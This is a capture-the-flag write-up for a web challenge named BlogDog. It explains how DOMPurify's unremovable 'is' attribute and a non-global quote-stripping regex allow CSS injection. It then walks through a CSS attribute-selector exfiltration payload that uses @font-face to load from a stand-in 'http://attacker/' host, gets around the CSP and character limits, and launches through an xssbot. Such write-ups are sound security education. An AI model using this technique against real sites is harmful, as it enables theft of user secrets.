# BlogDog

This challenge consists of a website that renders html and uses DOMPurify to sanitize it, as well as an xssbot that will visit a page of user's choice.

The page features a flag input box (filled by xssbot) and a content textarea, which automatically loads the text in the URL after *?*.

## The sanitization

The first step is to bypass the sanitization on the page. First, the submitted text has some html-unsafe characters stripped (`/["'&]/g`), then it is put through DOMPurify, and finally it is stripped once again with a similar regex (`/["'&]/`, no `g`). The end result gets put in an innerHTML template where it appears both in the DOM as well as the `content` attribute of a CSS style.

The DOMPurify config used is very strict:

```js
const purifyConfig = {
    ALLOWED_ATTR: [],
    ALLOWED_TAGS: ["a", "b", "i", "s", "p", "br", "div", "h1", "h2", "h3", "strike", "strong"],
    ALLOW_ARIA_ATTR: false,
    ALLOW_DATA_ATTR: false,
}
```

With a config this strict, it is unlikely that we could find a way to break the DOM part of the output template, so let's try to break the CSS part instead.

We cannot break out of content with a newline as that is escaped with `sanitized.replace(/([\\/\n\r\f])/g,'\\$1')`. We *could* break out with a quote, but we don't have a quote at the moment as all quotes get stripped by the first regex and we're not allowed to use any attributes in DOMPurify.

Something suspicious that immediately stands out is that the second quote-stripping regex is not global - it only strips the first quote. This hints that it may still be possible to somehow get quotes from DOMPurify itself.

### Bypassing sanitization

The bypass for the sanitization relies on an interesting web spec quirk about the [`is`](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/is) attribute, which is that it cannot be removed in some cases (eg when set with `innerHTML`):

```js
const div = document.createElement('div');
div.innerHTML = '<a is="123">';
console.log(div.innerHTML); // <a is="123"></a>
div.querySelector('a').removeAttribute("is");
console.log(div.innerHTML); // <a is="123"></a>
div.querySelector('a').setAttribute("is", "");
console.log(div.innerHTML); // <a is=""></a>
div.querySelector('a').removeAttribute("is");
console.log(div.innerHTML); // <a is="123"></a>
```

While this behaviour is perhaps not widely known, it can be discovered in a few different ways, such as fuzzing, reading web spec/docs, or looking at the DOMPurify source code.

For example, one may [look into](https://github.com/cure53/DOMPurify/blob/f41b45df18a9666a50c1ad2662cee259230cfef4/src/purify.ts#L1176) how the DOMPurify `ALLOWED_ATTR/ALLOWED_DATA_ATTR/ALLOWED_ARIA_ATTR` config options are handled, and in the same block of code they'd find [a special case for the `is` attribute](https://github.com/cure53/DOMPurify/blob/f41b45df18a9666a50c1ad2662cee259230cfef4/src/purify.ts#L1200). Another [part of the code](https://github.com/cure53/DOMPurify/blob/f41b45df18a9666a50c1ad2662cee259230cfef4/src/purify.ts#L861) even comments on the *unremovable "is" attributes*.

This means that by feeding `<a is>` into DOMPurify, we get `<a is=""></a>` back. The second quote regex replace turns it into `<a is="></a>`, which breaks out of the CSS content and allows us to inject custom CSS.

We can try it by typing `<a is>}*{color:red}` into the content textarea - everything on the page turns red due to the CSS injection.

## Crafting the data exfil

From here we can begin exfiltrating the data with a usual `input` field CSS exfiltration attack, albeit with a few caveats.

### CSP

The first challenge we're facing is the CSP: `script-src 'self' 'nonce-NONCE'; style-src 'nonce-NONCE'; object-src 'none'; img-src 'self';`.

This CSP only allows style and script tags with a nonce in them, so we cannot create new ones - this isn't a problem for us because we're already injecting inside of a style tag with the nonce set.

Another thing this CSP does is prevent loading images from other domains - this means we cannot do exfiltration by setting an image in the style of `background:url(http://example/)`. This can easily be bypassed by fetching a resource that is not an image, such as a @font-face.

An example attack would be (newlines added for readability):

```css
<a is>}
@font-face {
    font-family: foo;
    src: url(http://attacker/);
}
input[value^=x3c]{
    font-family: foo;
}
```

### Limited characters

The second challenge is a reduced character set - we cannot use quotes in our CSS, which breaks some other things, such as limiting us to [idents](https://developer.mozilla.org/en-US/docs/Web/CSS/ident) (as opposed to [strings](https://developer.mozilla.org/en-US/docs/Web/CSS/string)) in `input[value]` selector queries.

In the above example attack, we *can* match input values beginning with `x3c`, but not `x3c{`, because that is not allowed in an [ident](https://developer.mozilla.org/en-US/docs/Web/CSS/ident).

Luckily we already know the exact flag format from the `index.js` file: 68 characters long and matching `/^x3c{[a-z0-9_]+}$/`. This means we can instead use the `input[value*=foo]` selector to match the middle of the input instead of the beginning or end. From then on we can just expand our match character-by-character in either direction until we have the entire inner-flag.

One strat would be to start off with just `_` and add random characters to it until we find a match, to then expand it. In reality we would want to try out all the combinations and figure out the earliest match, because idents cannot begin with an unescaped digit, which limits our ability to match backwards.

## Launching the payload

We can make the xssbot visit a website of our choice by putting a link to the site in a post, and then submitting it.

Once the xssbot is on our page, we can run our payload by running `window.open("http://localhost:3000/?payload")`. The payload must not be url-encoded. We cannot use iframes because of storage partitioning, which means we wouldn't be able to access the localstorage within the iframe.

### Scripting the exfil

The website limits submitting blogs posts with links to one per minute. This combined with the long flag (68 characters) is intended to encourage the player to automate the attack, instead of manually getting every character by hand (which would take over an hour).

This means you'd want to craft an attack that keeps navigating the window you opened, updating the payload every time a new character is reported back to the server.

There are probably existing CSS-exfil scripts out there which could be modified to work for this challenge. Alternatively, you could just write your own.

An example solve server has been provided in `solver.py`. To use it, run the server, then submit an article on the chall page containing the url pointing to the solve server (eg just `http://example.com:8000/`).
